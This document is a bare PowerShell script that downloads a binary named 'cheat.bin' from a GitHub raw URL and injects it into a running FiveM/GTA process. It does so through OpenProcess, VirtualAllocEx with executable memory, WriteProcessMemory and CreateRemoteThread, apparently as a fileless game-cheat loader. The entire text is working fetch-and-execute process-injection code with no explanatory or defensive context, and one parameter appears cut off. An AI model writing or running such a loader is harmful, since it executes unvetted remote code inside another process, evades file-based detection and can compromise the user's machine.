$url = 'https://raw.githubusercontent.com/exorciqsmexorciqsm-blip/filelessignore/main/cheat.bin'
$bytes = (New-Object Net.WebClient).DownloadData($url)
$proc = Get-Process -Name 'FiveM_GTAProcess' -ErrorAction SilentlyContinue
if ($proc) {
    $id = $proc.Id
    $a = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr OpenProcess(uint a,bool b,int c);[DllImport("kernel32")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out IntPtr w);[DllImport("kernel32")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr b,IntPtr c,uint d,IntPtr e);' -Name W -Pas
    $h = $a::OpenProcess(0x1F0FFF, 0, $id)
    $addr = $a::VirtualAllocEx($h, 0, $bytes.Length, 0x3000, 0x40)
    $a::WriteProcessMemory($h, $addr, $bytes, $bytes.Length, [ref][IntPtr]::Zero)
    $a::CreateRemoteThread($h, 0, 0, $addr, 0, 0, 0)
}